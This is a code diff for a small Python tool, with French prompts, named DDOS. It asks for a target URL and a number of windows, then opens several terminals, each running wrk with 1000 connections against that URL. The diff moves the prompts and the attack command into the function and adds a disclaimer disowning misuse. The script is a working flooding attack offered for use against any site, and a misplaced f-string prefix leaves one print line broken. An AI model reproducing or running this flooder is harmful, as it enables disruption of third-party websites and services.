@@ -3,6 +3,10 @@ import platform
 import os
 
 def DDOS(nb_fenetres, commande, distribution="kali-linux"):
+    print("f{Colors.RED} Je ne suis pas responsable de ce que vous faites avec cette outils{Colors.RESET}")
+    nb = input("Quelle est le nombre de terminal ouvert? ")
+    URL = input("URL? (avec http.s): ")
+    cmd = f"wrk -t171 -c1000 -d40 {URL}"
     systeme = platform.system()
 
     for _ in range(nb_fenetres):
@@ -23,11 +27,3 @@ def DDOS(nb_fenetres, commande, distribution="kali-linux"):
                 print("Aucun terminal compatible")
         else:
             print(f"Système non supporté : {systeme}")
-
-# Exemple d'utilisation :
-if __name__ == "__main__":
-    import shutil
-    nb = input("Quelle est le nombre de terminal ouvert? ")
-    URL = input("URL? (avec http.s): ")
-    cmd = f"wrk -t171 -c1000 -d40 {URL}"
-    DDOS(int(nb), cmd)
